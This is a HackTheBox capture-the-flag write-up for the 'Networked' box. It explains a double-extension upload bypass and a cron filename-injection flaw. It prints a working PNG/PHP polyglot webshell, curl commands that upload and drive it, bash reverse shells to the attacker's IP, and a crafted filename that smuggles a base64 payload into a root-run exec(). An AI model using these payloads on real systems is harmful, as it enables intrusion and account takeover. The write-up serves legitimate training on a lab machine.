---
title: "Networked"
date: 2026-07-14 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, easy, file-upload, double-extension, magic-bytes, command-injection, cron, rce]
image:
    path: /assets/Images/Networked-avatar.png
    alt: Networked
description: "An exposed source backup reveals an upload filter that trusts forged PNG magic bytes and only checks the trailing extension, so a shell.php.png webshell yields code execution as apache; a root cron job that feeds upload filenames straight into a shell exec() is then abused with a malicious filename to pivot to the guly user and the user flag."
---
## Overview

Networked is an easy Linux box whose web root exposes a `backup.tar` of its own PHP source. Reading it shows an upload filter with two weak checks — a magic-byte MIME sniff and a suffix-only extension test — both of which a `shell.php.png` file defeats, giving execution as `apache`. From there a root cron job (`check_attack.php`) concatenates upload filenames into a shell `exec()` with no escaping, so a crafted filename injects a command and lands a shell as `guly` for the user flag. This post covers recon through user.

## Machine Matrix

<div style="text-align:center;margin:1.5rem 0;">
<svg viewBox="-60 0 420 300" width="420" style="max-width:100%;font-family:sans-serif;font-size:13px;">
  <polygon points="150.0,40.0 254.6,116.0 214.7,239.0 85.3,239.0 45.4,116.0" fill="none" stroke="#888" stroke-opacity="0.4"/>
  <polygon points="150.0,76.7 219.7,127.4 193.1,209.3 106.9,209.3 80.3,127.4" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <polygon points="150.0,113.4 184.8,138.7 171.5,179.6 128.5,179.6 115.2,138.7" fill="none" stroke="#888" stroke-opacity="0.3"/>
  <g stroke="#888" stroke-opacity="0.4">
    <line x1="150" y1="150" x2="150.0" y2="40.0"/>
    <line x1="150" y1="150" x2="254.6" y2="116.0"/>
    <line x1="150" y1="150" x2="214.7" y2="239.0"/>
    <line x1="150" y1="150" x2="85.3" y2="239.0"/>
    <line x1="150" y1="150" x2="45.4" y2="116.0"/>
  </g>
  <polygon points="150.0,62.0 233.7,122.8 150.0,150.0 111.2,203.4 129.1,143.2" fill="#9fef00" fill-opacity="0.3" stroke="#9fef00" stroke-width="2"/>
  <g fill="currentColor" text-anchor="middle">
    <text x="150" y="28">Enumeration</text>
    <text x="278" y="112" text-anchor="start">Real-Life</text>
    <text x="226" y="258" text-anchor="start">CVE</text>
    <text x="74" y="258" text-anchor="end">Custom Exploitation</text>
    <text x="22" y="112" text-anchor="end">CTF-like</text>
  </g>
</svg>
</div>

Source-backup enumeration exposes double-extension upload and a cron exec() injection requiring a hand-built polyglot webshell and crafted malicious filename; no CVE, custom-chaining is the standout.

## Recon

| Port | Service | Notes |
|------|---------|-------|
| 22/tcp | OpenSSH 7.4 | default |
| 80/tcp | Apache 2.4.6 (CentOS), PHP/5.4.16 | "FaceMash" landing page |

```bash
nmap -p- --min-rate=1000 -T4 10.10.10.146
nmap -p22,80 -sC -sV 10.10.10.146
```

Port 80 shows a placeholder page ("Hello mate, we're building the new FaceMash!"). Nothing else is interactive, so move to content discovery.

## Enumeration

```bash
gobuster dir -u http://10.10.10.146/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php
```

```
/index.php   (Status: 200)
/uploads     (Status: 301)
/photos.php  (Status: 200)
/upload.php  (Status: 200)
/lib.php     (Status: 200)
/backup      (Status: 301)
```

`upload.php` accepts files and `photos.php` displays them, but the prize is `/backup` — it holds a tar archive of the application source:

```bash
wget http://10.10.10.146/backup/backup.tar
tar xvf backup.tar    # index.php lib.php photos.php upload.php
```

Reading `upload.php` and `lib.php` reveals the two flaws that chain together:

- **MIME check by magic bytes.** `check_file_type()` calls `mime_content_type()`, which infers the type from the file's leading bytes — fully attacker-controlled. Prepend a PNG header and it reports `image/png`.
- **Suffix-only extension check.** The allow-list uses `substr_compare($name, $ext, -strlen($ext))`, which only verifies the name *ends* in `.jpg/.png/.gif/.jpeg`. It never rejects an extra extension earlier in the name, so `shell.php.png` passes — and Apache happily executes the `.php` part.

The stored filename is derived from `REMOTE_ADDR` with dots replaced by underscores, plus the original extension — so an upload from `10.10.14.2` becomes `10_10_14_2.php.png`.

## Foothold

**1 — Build a polyglot webshell.** Start the file with the PNG magic bytes (`89 50 4E 47 0D 0A 1A 0A`), then append a PHP one-liner:

```bash
printf '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a' > mime_shell.php.png
printf '<?php system($_REQUEST["cmd"]); ?>' >> mime_shell.php.png
```

**2 — Upload and confirm RCE.** The MIME sniff sees PNG, the extension check sees `.png`, and the file is saved under `/uploads/` with a `.php.png` name that Apache executes:

```bash
curl -s -F "myFile=@mime_shell.php.png" -F "submit=go!" http://10.10.10.146/upload.php
curl -s "http://10.10.10.146/uploads/10_10_14_2.php.png?cmd=id"
# -> uid=48(apache) gid=48(apache) groups=48(apache)
```

**3 — Reverse shell as apache.**

```bash
rlwrap nc -lvnp 1234
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.2/1234 0>&1"' \
  http://10.10.10.146/uploads/10_10_14_2.php.png
```

**4 — Pivot to guly via cron command injection.** In `/home/guly` there is a cron file and a script:

```bash
cat /home/guly/crontab.guly /home/guly/check_attack.php
```

`crontab.guly` runs `php /home/guly/check_attack.php` every 3 minutes (as `guly`). That script scans `/var/www/html/uploads/` and deletes "invalid" files by concatenating the filename straight into a shell command:

```php
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```

`$value` (the filename) is never escaped, so a filename starting with `;` terminates the `rm` and runs whatever follows. `/` is illegal in filenames, so base64-encode the payload and decode it inline. Create the malicious file from the apache shell and wait for the cron:

```bash
echo 'bash -c "bash -i >/dev/tcp/10.10.14.2/4444 0>&1"' | base64
cd /var/www/html/uploads
touch -- ';echo <BASE64_PAYLOAD>| base64 -d | bash'
```

```bash
nc -lvnp 4444
# Connection from 10.10.10.146 ...
# uid=1000(guly) gid=1000(guly) groups=1000(guly)
python -c "import pty;pty.spawn('/bin/bash')"
```

## User flag

The cron payload returns a shell as `guly`, who owns the user flag:

```bash
cat /home/guly/user.txt
# [redacted]
```

Command execution as `guly` and the user flag are ours.

Privilege escalation (the `sudo changename.sh` ifcfg network-scripts injection to root) is left as an exercise — this post stops at user.


<div style="text-align:center;margin-top:2rem;">
  <img src="/assets/Images/Networked-avatar.png" alt="Networked" width="200" height="200" style="border-radius:8px;" />
  <p style="margin-top:1rem;">
    <a href="https://patreon.com/Infinit3i?utm_medium=unknown&utm_source=join_link&utm_campaign=creatorshare_creator&utm_content=copyLink"
       style="display:inline-block;background:#FF424D;color:#fff;font-weight:600;padding:0.6rem 1.4rem;border-radius:9999px;text-decoration:none;">
      Find more on Patreon
    </a>
  </p>
</div>
